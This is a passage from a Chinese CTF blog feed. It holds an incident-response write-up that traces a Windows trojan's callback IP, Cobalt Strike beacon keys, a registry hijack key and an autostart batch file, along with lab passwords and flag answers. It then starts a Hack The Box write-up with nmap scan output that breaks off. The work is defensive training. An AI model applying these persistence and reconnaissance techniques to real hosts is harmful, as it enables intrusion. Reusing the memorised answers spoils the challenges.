class="hljs-number">97</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>查找 <code>config.xml</code> 配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*config.xml&quot;</span><br></code></pre></td></tr></table></figure><p>在 <code>/cf/conf/config.xml</code> 文件中找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/8c8151bbb2eaa897.png"></p><h1 id="WinCS"><a href="#WinCS" class="headerlink" title="WinCS"></a>WinCS</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.受控机器木马的回连的<span class="hljs-built_in">ip</span>地址和端口是？（flag&#123;<span class="hljs-built_in">ip</span>:端口&#125;）<br><span class="hljs-number">2</span>.分析流量信息，攻击者尝试修改的jhon账户密码是什么？<br><span class="hljs-number">3</span>.分析流量当中，攻击者查看的文件中flag内容是什么？<br><span class="hljs-number">4</span>.攻击者在攻击过程当中修改过的注册表目录是什么？<br><span class="hljs-number">5</span>.受控机当中加密文件的内容是什么？<br><span class="hljs-number">6</span>.受控机木马的自启动文件路径是什么？<br></code></pre></td></tr></table></figure><h2 id="WinCS1"><a href="#WinCS1" class="headerlink" title="WinCS1"></a>WinCS1</h2><p>在火绒的信任项中有一个可以 <code>.exe</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/a40ffff95fae77bd.png"></p><p>拿出来放入微步沙箱查杀，判定为木马</p><p><img src="https://img.dkdun.cn/v1/2025/12/b390012a0800795b.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a42499ac6767e53e.png"></p><p>拿到回连 IP： 61.139.2.139:80，md5 加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>f5804a75be7662bf6745457be3b1a18&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS2"><a href="#WinCS2" class="headerlink" title="WinCS2"></a>WinCS2</h2><p>jhon 用户目录下有两张一样的图片</p><p><img src="https://img.dkdun.cn/v1/2025/12/e534d3fbfecad5da.png"></p><p>用 010 打开发现两张图片最后都有压缩包数据，并且能看见 <code>.cobaltstrike.beacon_keys</code> 字样</p><p><img src="https://img.dkdun.cn/v1/2025/12/77db36ec04799d87.png"></p><p>新建十六进制文件，把两张图片中的数据复制到新的文件保存得到压缩包，里面有 <code>.cobaltstrike.beacon_keys</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/46bd81ce2e2e4faf.png"></p><p>导入 NatA 分析得到 jhon 用户密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/80c55bba110881b5.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">flag&#123;<span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssW0rd</span><span class="hljs-keyword">@123</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS3"><a href="#WinCS3" class="headerlink" title="WinCS3"></a>WinCS3</h2><p>往下翻找到</p><p><img src="https://img.dkdun.cn/v1/2025/12/8833b2ee636d36bd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">31975589</span>df49e6ce84853be7582549f4&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS4"><a href="#WinCS4" class="headerlink" title="WinCS4"></a>WinCS4</h2><p><img src="https://img.dkdun.cn/v1/2025/12/d0adeb57519e7386.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">HKEY_CURRENT_USER\Software\Classes\mscfile\<span class="hljs-built_in">shell</span>\<span class="hljs-built_in">open</span>\<span class="hljs-keyword">command</span><br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">87</span>a76255029843238bf87091dd5a6c88&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS5"><a href="#WinCS5" class="headerlink" title="WinCS5"></a>WinCS5</h2><p>从之前的分析中还发现 jhon 用户目录下还有一个 <code>passkey.txt</code>，并且还有密码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">PolarCTF@</span><span class="hljs-number">2025</span>Spring<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7c9eb10afeafad45.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;fc51bd0633d256f2dcbe282efa205c3a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="WinCS6"><a href="#WinCS6" class="headerlink" title="WinCS6"></a>WinCS6</h2><p>在 <code>C:\Users\jhon\AppData\Local\Temp</code> 下发现批处理文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/9d16b9098fad2af6.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\jhon\AppData\Local\Temp\power.bat<br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;e991ef211ab8adc893dc874c4ae929b3&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Chemistry</title>
    <link href="/2025/03/22/HTB-Chemistry/"/>
    <url>/2025/03/22/HTB-Chemistry/</url>
    
    <content type="html"><![CDATA[<p>很简单的一个靶机，和 <a href="https://buutt3rf1y.github.io/2025/02/14/Shop/#SSH">THM-Publisher</a> 有一点点像</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">└─# nmap -sS -sV -Pn -A 10.10.11.38</span><br><span class="language-xml">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 19:06 CST</span><br><span class="language-xml">Nmap scan report for 10.10.11.38</span><br><span class="language-xml">Host is up (0.32s latency).</span><br><span class="language-xml">Not shown: 998 closed tcp ports (reset)</span><br><span class="language-xml">PORT     STATE SERVICE VERSION</span><br><span class="language-xml">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="language-xml">| ssh-hostkey:</span><br><span class="language-xml">|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)</span><br><span class="language-xml">|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)</span><br><span class="language-xml">|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)</span><br><span class="language-xml">5000/tcp open  upnp?</span><br><span class="language-xml">| fingerprint-strings:</span><br><span class="language-xml">|   GetRequest:</span><br><span class="language-xml">|     HTTP/1.1 200 OK</span><br><span class="language-xml">|     Server: Werkzeug/3.0.3 Python/3.9.5</span><br><span class="language-xml">|     Date: Sat, 22 Mar 2025 11:06:46 GMT</span><br><span class="language-xml">|     Content-Type: text/html; charset=utf-8</span><br><span class="language-xml">|     Content-Length: 719</span><br><span class="language-xml">|     Vary: Cookie</span><br><span class="language-xml">|     Connection: close</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemistry - Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/styles.css&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span></span><br><span class="language-xml">|     class=&quot;title&quot;&gt;Chemistry CIF Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">|     href=&quot;/register&quot; class=&quot;btn&quot;&gt;Register<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|   RTSPRequest:</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code: 400<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Message: Bad request version (&#x27;RTSP/1.0&#x27;).<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|_    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="language-xml">SF-Port5000-TCP:V=7.94SVN%I=7%D=3/22%Time=67DE99C3%P=x86_64-pc-linux-gnu%r</span><br><span class="language-xml">SF:(GetRequest,38A,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\</span><br><span class="language-xml">SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2022\x20Mar\x202025\x2011:06:46\x20</span><br><span class="language-xml">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\</span><br><span class="language-xml">SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<span class="hljs-meta">&lt;!DOCTYPE\x20h</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:tml&gt;</span>\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>\n\x20\x20\x20\x20&lt;meta\x20charset=\</span><br><span class="language-xml">SF:&quot;UTF-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;widt</span><br><span class="language-xml">SF:h=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemis</span><br><span class="language-xml">SF:try\x20-\x20Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x</span><br><span class="language-xml">SF:20href=\&quot;/static/styles\.css\&quot;&gt;\n<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>\n\x20\x20\x20\x20\n\x2</span><br><span class="language-xml">SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20&lt;div\x20class=</span><br><span class="language-xml">SF:\&quot;container\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1\x20class=\&quot;title\&quot;&gt;</span><br><span class="language-xml">SF:Chemistry\x20CIF\x20Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>W</span><br><span class="language-xml">SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x</span><br><span class="language-xml">SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In</span><br><span class="language-xml">SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c</span><br><span class="language-xml">SF:ontained\x20within\.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;div\x20class</span><br><span class="language-xml">SF:=\&quot;buttons\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">SF:&lt;a\x20href=\&quot;/login\&quot;\x20class=\&quot;btn\&quot;&gt;Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>\n\x20\x20\x20\x20\x20\</span><br><span class="language-xml">SF:x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;/register\&quot;\x20class=\&quot;btn\&quot;&gt;Re</span><br><span class="language-xml">SF:gister<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n\x20\x20\x</span><br><span class="language-xml">SF:20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>\n&lt;&quot;)%r(RTSPRequest,1F4,&quot;<span class="hljs-meta">&lt;!DOCTYPE\x20HTML\x20PUBL</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:IC\x20\<span class="hljs-string">&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Cont</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ent-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20r</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:esponse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20v</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ersion\x20\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Err</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:quest\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/body&gt;\n&lt;/html&gt;\n&quot;</span>);</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">No</span> <span class="hljs-keyword">exact</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">matches</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">host</span> (<span class="hljs-keyword">If</span> <span class="hljs-keyword">you</span> <span class="hljs-keyword">know</span> <span class="hljs-keyword">what</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">see</span> <span class="hljs-keyword">https</span>://<span class="hljs-keyword">nmap</span>.<span class="hljs-keyword">org</span>/<span class="hljs-keyword">submit</span>/ ).</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TCP</span>/IP <span class="hljs-keyword">fingerprint</span>:</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:SCAN(V=7.94<span class="hljs-keyword">SVN</span>%E=4%D=3/22%<span class="hljs-keyword">OT</span>=22%<span class="hljs-keyword">CT</span>=1%<span class="hljs-keyword">CU</span>=37541%<span class="hljs-keyword">PV</span>=Y%<span class="hljs-keyword">DS</span>=3%<span class="hljs-keyword">DC</span>=T%G=Y%<span class="hljs-keyword">TM</span>=67<span class="hljs-keyword">DE</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:9<span class="hljs-keyword">A52</span>%P=<span class="hljs-keyword">x86_64-pc-linux-gnu</span>)SEQ(<span class="hljs-keyword">SP</span>=106%<span class="hljs-keyword">GCD</span>=1%<span class="hljs-keyword">ISR</span>=10D%<span class="hljs-keyword">TI</span>=Z%<span class="hljs-keyword">CI</span>=Z%<span class="hljs-keyword">II</span>=I%<span class="hljs-keyword">TS</span>=A)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:OPS(<span class="hljs-keyword">O1</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O2</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O3</span>=<span class="hljs-keyword">M53ANNT11NW7</span>%<span class="hljs-keyword">O4</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O5</span>=<span class="hljs-keyword">M53A</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:<span class="hljs-keyword">ST11NW7</span>%<span class="hljs-keyword">O6</span>=<span class="hljs-keyword">M53AST11</span>)WIN(<span class="hljs-keyword">W1</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W2</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W3</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W4</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W5</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W6</span>=<span class="hljs-keyword">FE88</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:ECN(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=<span class="hljs-keyword">FAF</span>0%O=<span class="hljs-keyword">M53ANNSNW7</span>%<span class="hljs-keyword">CC</span>=Y%Q=)T1(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%S=O%A=S+%</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:F=<span class="hljs-keyword">AS</span>%<span class="hljs-keyword">RD</span>=0%Q=)T2(R=N)T3(R=N)T4(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:5(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)T6(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T7(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)U1(R=Y%<span class="hljs-keyword">DF</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=N%T=40%<span class="hljs-keyword">IPL</span>=164%<span class="hljs-keyword">UN</span>=0%<span class="hljs-keyword">RIPL</span>=G%<span class="hljs-keyword">RID</span>=G%<span class="hljs-keyword">RIPCK</span>=G%<span class="hljs-keyword">RUCK</span>=<span class="hljs-keyword">FA57</span>%<span class="hljs-keyword">RUD</span>=G)IE(R=Y%<span class="hljs-keyword">DFI</span>=N%T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=40%<span class="hljs-keyword">CD</span>=S)</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Network</span> <span class="hljs-keyword">Distance</span>: 3 <span class="hljs-keyword">hops</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Service</span> <span class="hljs-keyword">Info</span>: <span class="hljs-keyword">OS</span>: <span class="hljs-keyword">Linux</span>; <span class="hljs-keyword">CPE</span>: <span class="hljs-keyword">cpe</span>:/o:linux:linux_kernel</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TRACEROUTE</span> (<span class="hljs-keyword">using</span> <span class="hljs-keyword">port</span> 993/<span class="hljs-keyword">tcp</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">HOP</span> <span class="hljs-keyword">RTT</span>       <span class="hljs-keyword">ADDRESS</span></span></span><br><span class="hljs-meta"><span class="language-xml">1   0.27 <span class="hljs-keyword">ms</span>   172.30.144.1</span></span><br><span class="hljs-meta"><span class="language-xml">2   374.51 <span class="hljs-keyword">ms</span> 10.10.16.1</span></span><br><span class="hljs-meta"><span class="language-xml">3   374.69 <span class="hljs-keyword">ms</span> 10.10.11.38</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Service</span> <span class="hljs-keyword">detection</span> <span 